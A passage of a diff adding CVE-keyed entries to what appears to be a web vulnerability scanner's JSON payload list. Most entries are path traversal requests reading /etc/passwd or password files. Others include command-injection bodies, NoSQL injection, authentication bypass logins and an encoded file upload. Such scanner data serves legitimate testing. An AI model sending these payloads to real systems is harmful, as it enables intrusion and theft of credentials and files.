+          "payload": "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+          "description": "[Nuclei] Spring Cloud Config Server - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2020-5410",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-5410",
+          "applies_to": {
+            "path_contains": [
+              "development"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_8163",
+          "name": "CVE-2020-8163 Ruby on Rails <5.0.1 - Remote Code Execution",
+          "payload": "/?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23",
+          "description": "[Nuclei] Ruby on Rails <5.0.1 - Remote Code Execution",
+          "risk": "high",
+          "cve": "CVE-2020-8163",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-8163",
+          "applies_to": {
+            "powered_by": [
+              "rails"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_8209",
+          "name": "CVE-2020-8209 Citrix XenMobile Server - Local File Inclusion",
+          "payload": "/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd",
+          "description": "[Nuclei] Citrix XenMobile Server - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2020-8209",
+          "location": "path",
+          "param": "",
+          "reference": "https://support.citrix.com/article/CTX277457",
+          "applies_to": {
+            "path_contains": [
+              "jsp",
+              "help-sb-download.jsp"
+            ],
+            "powered_by": [
+              "citrix"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_8982",
+          "name": "CVE-2020-8982 Citrix ShareFile StorageZones <=5.10.x - Arbitrary File Read",
+          "payload": "/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri",
+          "description": "[Nuclei] Citrix ShareFile StorageZones <=5.10.x - Arbitrary File Read",
+          "risk": "high",
+          "cve": "CVE-2020-8982",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-8982",
+          "applies_to": {
+            "path_contains": [
+              "xmlpeek.aspx",
+              "validate.ashx"
+            ],
+            "powered_by": [
+              "citrix"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_9484",
+          "name": "CVE-2020-9484 Apache Tomcat Remote Command Execution",
+          "payload": "/index.jsp",
+          "description": "[Nuclei] Apache Tomcat Remote Command Execution",
+          "risk": "high",
+          "cve": "CVE-2020-9484",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9484",
+          "applies_to": {
+            "path_contains": [
+              "index.jsp"
+            ],
+            "server": [
+              "apache",
+              "tomcat"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_11248",
+          "name": "CVE-2019-11248 Debug Endpoint pprof - Exposure Detection",
+          "payload": "/debug/pprof/",
+          "description": "[Nuclei] Debug Endpoint pprof - Exposure Detection",
+          "risk": "high",
+          "cve": "CVE-2019-11248",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-11248",
+          "applies_to": {
+            "path_contains": [
+              "debug",
+              "pprof"
+            ],
+            "powered_by": [
+              "kubernetes"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_9922",
+          "name": "CVE-2019-9922 Joomla! Harmis Messenger 1.2.2 - Local File Inclusion",
+          "payload": "/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd",
+          "description": "[Nuclei] Joomla! Harmis Messenger 1.2.2 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2019-9922",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-9922",
+          "applies_to": {
+            "path_contains": [
+              "component"
+            ],
+            "powered_by": [
+              "joomla",
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_12613",
+          "name": "CVE-2018-12613 PhpMyAdmin <4.8.2 - Local File Inclusion",
+          "payload": "/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
+          "description": "[Nuclei] PhpMyAdmin <4.8.2 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2018-12613",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-12613",
+          "applies_to": {
+            "powered_by": [
+              "phpmyadmin"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_18264",
+          "name": "CVE-2018-18264 Kubernetes Dashboard <1.10.1 - Authentication Bypass",
+          "payload": "/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs",
+          "description": "[Nuclei] Kubernetes Dashboard <1.10.1 - Authentication Bypass",
+          "risk": "high",
+          "cve": "CVE-2018-18264",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-18264",
+          "applies_to": {
+            "powered_by": [
+              "kubernetes"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_6008",
+          "name": "CVE-2018-6008 Joomla! Jtag Members Directory 5.3.7 - Local File Inclusion",
+          "payload": "/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Joomla! Jtag Members Directory 5.3.7 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2018-6008",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-6008",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_7490",
+          "name": "CVE-2018-7490 uWSGI PHP Plugin Local File Inclusion",
+          "payload": "/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+          "description": "[Nuclei] uWSGI PHP Plugin Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2018-7490",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-7490",
+          "applies_to": {
+            "path_contains": [
+              "passwd"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_9205",
+          "name": "CVE-2018-9205 Drupal avatar_uploader v7.x-1.0-beta8 - Local File Inclusion",
+          "payload": "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Drupal avatar_uploader v7.x-1.0-beta8 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2018-9205",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-9205",
+          "applies_to": {
+            "path_contains": [
+              "sites",
+              "all"
+            ],
+            "powered_by": [
+              "drupal"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2017_12637",
+          "name": "CVE-2017-12637 SAP NetWeaver Application Server Java 7.5 - Local File Inclusion",
+          "payload": "/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..",
+          "description": "[Nuclei] SAP NetWeaver Application Server Java 7.5 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2017-12637",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-12637",
+          "applies_to": {
+            "path_contains": [
+              "scheduler"
+            ],
+            "powered_by": [
+              "java"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2017_14849",
+          "name": "CVE-2017-14849 Node.js <8.6.0 - Directory Traversal",
+          "payload": "/static/../../../a/../../../../etc/passwd",
+          "description": "[Nuclei] Node.js <8.6.0 - Directory Traversal",
+          "risk": "high",
+          "cve": "CVE-2017-14849",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-14849",
+          "applies_to": {
+            "powered_by": [
+              "nodejs"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2016_4977",
+          "name": "CVE-2016-4977 Spring Security OAuth2 Remote Command Execution",
+          "payload": "/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test",
+          "description": "[Nuclei] Spring Security OAuth2 Remote Command Execution",
+          "risk": "high",
+          "cve": "CVE-2016-4977",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-4977",
+          "applies_to": {
+            "path_contains": [
+              "oauth",
+              "authorize"
+            ],
+            "powered_by": [
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2015_4074",
+          "name": "CVE-2015-4074 Joomla! Helpdesk Pro plugin <1.4.0 - Local File Inclusion",
+          "payload": "/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe",
+          "description": "[Nuclei] Joomla! Helpdesk Pro plugin <1.4.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2015-4074",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-4074",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2014_3744",
+          "name": "CVE-2014-3744 Node.js st module Directory Traversal",
+          "payload": "/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "description": "[Nuclei] Node.js st module Directory Traversal",
+          "risk": "high",
+          "cve": "CVE-2014-3744",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-3744",
+          "applies_to": {
+            "powered_by": [
+              "nodejs"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_0157",
+          "name": "CVE-2010-0157 Joomla! Component com_biblestudy - Local File Inclusion",
+          "payload": "/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Joomla! Component com_biblestudy - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-0157",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-0157",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_0759",
+          "name": "CVE-2010-0759 Joomla! Plugin Core Design Scriptegrator - Local File Inclusion",
+          "payload": "/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd",
+          "description": "[Nuclei] Joomla! Plugin Core Design Scriptegrator - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-0759",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-0759",
+          "applies_to": {
+            "path_contains": [
+              "plugins",
+              "system"
+            ],
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_0972",
+          "name": "CVE-2010-0972 Joomla! Component com_gcalendar Suite 2.1.5 - Local File Inclusion",
+          "payload": "/index.php?option=com_gcalendar&controller=../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component com_gcalendar Suite 2.1.5 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-0972",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-0972",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_0985",
+          "name": "CVE-2010-0985 Joomla! Component com_abbrev - Local File Inclusion",
+          "payload": "/index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component com_abbrev - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-0985",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-0985",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1306",
+          "name": "CVE-2010-1306 Joomla! Component Picasa 2.0 - Local File Inclusion",
+          "payload": "/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Picasa 2.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1306",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1306",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1470",
+          "name": "CVE-2010-1470 Joomla! Component Web TV 1.0 - Local File Inclusion",
+          "payload": "/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Web TV 1.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1470",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1470",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1471",
+          "name": "CVE-2010-1471 Joomla! Component Address Book 1.5.0 - Local File Inclusion",
+          "payload": "/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Address Book 1.5.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1471",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1471",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1472",
+          "name": "CVE-2010-1472 Joomla! Component Horoscope 1.5.0 - Local File Inclusion",
+          "payload": "/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Horoscope 1.5.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1472",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1472",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1495",
+          "name": "CVE-2010-1495 Joomla! Component Matamko 1.01 - Local File Inclusion",
+          "payload": "/index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Matamko 1.01 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1495",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1495",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1531",
+          "name": "CVE-2010-1531 Joomla! Component redSHOP 1.0 - Local File Inclusion",
+          "payload": "/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component redSHOP 1.0 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1531",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1531",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1533",
+          "name": "CVE-2010-1533 Joomla! Component TweetLA 1.0.1 - Local File Inclusion",
+          "payload": "/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component TweetLA 1.0.1 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1533",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1533",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1535",
+          "name": "CVE-2010-1535 Joomla! Component TRAVELbook 1.0.1 - Local File Inclusion",
+          "payload": "/index.php?option=com_travelbook&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component TRAVELbook 1.0.1 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1535",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1535",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1602",
+          "name": "CVE-2010-1602 Joomla! Component ZiMB Comment 0.8.1 - Local File Inclusion",
+          "payload": "/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component ZiMB Comment 0.8.1 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1602",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1602",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1603",
+          "name": "CVE-2010-1603 Joomla! Component ZiMBCore 0.1 - Local File Inclusion",
+          "payload": "/index.php?option=com_zimbcore&controller=../../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component ZiMBCore 0.1 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1603",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1603",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_1653",
+          "name": "CVE-2010-1653 Joomla! Component Graphics 1.0.6 - Local File Inclusion",
+          "payload": "/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Graphics 1.0.6 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2010-1653",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-1653",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_2861",
+          "name": "CVE-2010-2861 Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI",
+          "payload": "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en",
+          "description": "[Nuclei] Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI",
+          "risk": "high",
+          "cve": "CVE-2010-2861",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861",
+          "applies_to": {
+            "path_contains": [
+              "cfide",
+              "administrator"
+            ],
+            "powered_by": [
+              "coldfusion"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_23061",
+          "name": "CVE-2025-23061 Mongoose - NoSQL Injection",
+          "payload": "/posts?authorMatch={\"$and\":[{\"$where\":\"this.isAdmin\"}]}",
+          "description": "[Nuclei] Mongoose - NoSQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2025-23061",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-23061",
+          "applies_to": {
+            "path_contains": [
+              "posts"
+            ],
+            "powered_by": [
+              "nodejs"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_29868",
+          "name": "CVE-2024-29868 Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery To",
+          "payload": "/streampipes-backend/api/v2/auth/settings",
+          "description": "[Nuclei] Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery To",
+          "risk": "critical",
+          "cve": "CVE-2024-29868",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-29868",
+          "applies_to": {
+            "path_contains": [
+              "streampipes-backend"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_32114",
+          "name": "CVE-2024-32114 Apache ActiveMQ 6.x < 6.1.2 - Broken Access Control",
+          "payload": "/api/jolokia/search/org.apache.activemq:type=Broker,*",
+          "description": "[Nuclei] Apache ActiveMQ 6.x < 6.1.2 - Broken Access Control",
+          "risk": "high",
+          "cve": "CVE-2024-32114",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-32114",
+          "applies_to": {
+            "path_contains": [
+              "jolokia"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_38816",
+          "name": "CVE-2024-38816 WebMvc.fn/WebFlux.fn - Path Traversal",
+          "payload": "/static/link/%2e%2e/etc/passwd",
+          "description": "[Nuclei] WebMvc.fn/WebFlux.fn - Path Traversal",
+          "risk": "high",
+          "cve": "CVE-2024-38816",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-38816",
+          "applies_to": {
+            "path_contains": [
+              "link"
+            ],
+            "powered_by": [
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_39226",
+          "name": "CVE-2021-39226 Grafana Snapshot - Authentication Bypass",
+          "payload": "/api/snapshots/:key",
+          "description": "[Nuclei] Grafana Snapshot - Authentication Bypass",
+          "risk": "high",
+          "cve": "CVE-2021-39226",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-39226",
+          "applies_to": {
+            "path_contains": [
+              "snapshots"
+            ],
+            "powered_by": [
+              "grafana"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_0545",
+          "name": "CVE-2026-0545 MLflow Job API - Authentication Bypass",
+          "payload": "/ajax-api/3.0/jobs/",
+          "description": "[Nuclei] MLflow Job API - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-0545",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-0545",
+          "applies_to": {
+            "path_contains": [
+              "ajax-api",
+              "3.0"
+            ]
+          },
+          "body": "{\"job_name\":\"run_task\",\"params\":{\"command\":\"id\"}}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_10520",
+          "name": "CVE-2026-10520 Ivanti Sentry - OS Command Injection",
+          "payload": "/mics/api/v2/sentry/mics-config/handleMessage",
+          "description": "[Nuclei] Ivanti Sentry - OS Command Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-10520",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-10520",
+          "applies_to": {
+            "path_contains": [
+              "mics"
+            ]
+          },
+          "body": "message=execute%20system%20%2fconfiguration%2fsystem%2fcommandexec%20%3ccommandexec%3e%3cindex%3e1%3c%2findex%3e%3creqandres%3eecho%20CVE-2026-10520%3c%2freqandres%3e%3c%2fcommandexec%3e",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_1357",
+          "name": "CVE-2026-1357 WPvivid Backup & Migration <= 0.9.123 - Arbitrary File Upload",
+          "payload": "/",
+          "description": "[Nuclei] WPvivid Backup & Migration <= 0.9.123 - Arbitrary File Upload",
+          "risk": "critical",
+          "cve": "CVE-2026-1357",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-1357",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "wpvivid_action=send_to_site&wpvivid_content=MDAzQUJDMDAwMDAwMDAwMDAwMDExMDUGpYqxgOo0%2FZM3%2BLE%2B23CYS%2BI8Sbr6wwwU6dJweFxMk%2BOogH3GIpPZZMrm72oUS3vnrlf0AXv1vmGVBIbLo3QcQs%2B4JU7cLQw1kWByCFlYkpHcBuzxjEbVtT8VSdFgb6NLW6cpP4BdWT8bJx%2F%2FAOO09m3EFtf2sOcE%2BJjFJAew%2BELondwDkz3u5mssxGaQrlvWgaIlmPwz3FZx8dWC%2FHy7k4P3S5IJ7JV0tefjHJKCOzjPHngkZENu1uI2LmE6JaeF7XdXJCcmFOrNex4yJgIO0raawogHW457fM4wXKDnrM3bwxeLn5KwvAgadaTj4F9zWHxnjBmpa%2BtIaohISVcA5%2BGv6cAA95rzOoXBGUaI",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_21891",
+          "name": "CVE-2026-21891 ZimaOS - Authentication Bypass",
+          "payload": "/v1/users/login",
+          "description": "[Nuclei] ZimaOS - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-21891",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-21891",
+          "applies_to": {
+            "path_contains": [
+              "users"
+            ]
+          },
+          "body": "{\n  \"username\": \"root\",\n  \"password\": \"anything\"\n}",
+          "headers": {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Origin": "",
+            "Referer": "/"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_28409",
+          "name": "CVE-2026-28409 WeGIA <= 3.6.4 - Remote Code Execution",
+          "payload": "/WeGIA/html/login.php",
+          "description": "[Nuclei] WeGIA <= 3.6.4 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-28409",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-28409",
+          "applies_to": {
+            "path_contains": [
+              "wegia",
+              "html"
+            ]
+          },
+          "body": "c=true&cpf=admin&id_pessoa=1",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_3891",
+          "name": "CVE-2026-3891 Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload",
+          "payload": "/wp-admin/admin-ajax.php",
+          "description": "[Nuclei] Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload",
+          "risk": "critical",
+          "cve": "CVE-2026-3891",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://github.com/m4sh-wacker/CVE-2026-3891-Pix-for-WooCommerce-Plugin-Exploit",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "action=lkn_pix_for_woocommerce_generate_nonce&action_name=lkn_pix_for_woocommerce_c6_settings_nonce",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_40887",
+          "name": "CVE-2026-40887 Vendure Core - SQL Injection",
+          "payload": "/shop-api",
+          "description": "[Nuclei] Vendure Core - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-40887",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-40887",
+          "applies_to": {
+            "path_contains": [
+              "shop-api"
+            ]
+          },
+          "body": "{\"query\":\"{ __typename }\"}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_41176",
+          "name": "CVE-2026-41176 Rclone RC - Broken Access Control",
+          "payload": "/config/listremotes",
+          "description": "[Nuclei] Rclone RC - Broken Access Control",
+          "risk": "critical",
+          "cve": "CVE-2026-41176",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-41176",
+          "applies_to": {
+            "path_contains": [
+              "config",
+              "listremotes"
+            ]
+          },
+          "body": "{}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_41179",
+          "name": "CVE-2026-41179 RClone RC - Command Injection",
+          "payload": "/rc/noop",
+          "description": "[Nuclei] RClone RC - Command Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-41179",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-41179",
+          "applies_to": {
+            "path_contains": [
+              "noop"
+            ]
+          },
+          "body": "{}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_47668",
+          "name": "CVE-2026-47668 DbGate - Remote Code Execution via Anonymous JWT",
+          "payload": "/auth/login",
+          "description": "[Nuclei] DbGate - Remote Code Execution via Anonymous JWT",
+          "risk": "critical",
+          "cve": "CVE-2026-47668",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://www.cve.org/CVERecord?id=CVE-2026-47668",
+          "applies_to": {
+            "path_contains": [
+              "auth"
+            ]
+          },
+          "body": "{\"amoid\":\"none\"}",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_48611",
+          "name": "CVE-2026-48611 phpBB < 3.3.17 - Authentication Bypass",
+          "payload": "/ucp.php?mode=login_link&auth_provider=apache&login_link_aikido=1",
+          "description": "[Nuclei] phpBB < 3.3.17 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-48611",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-48611",
+          "applies_to": {
+            "path_contains": [
+              "ucp.php"
+            ]
+          },
+          "body": "login_username=admin&login_password=x&login=Login",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "Basic YWRtaW46eA=="
+          }
+        },
+        {
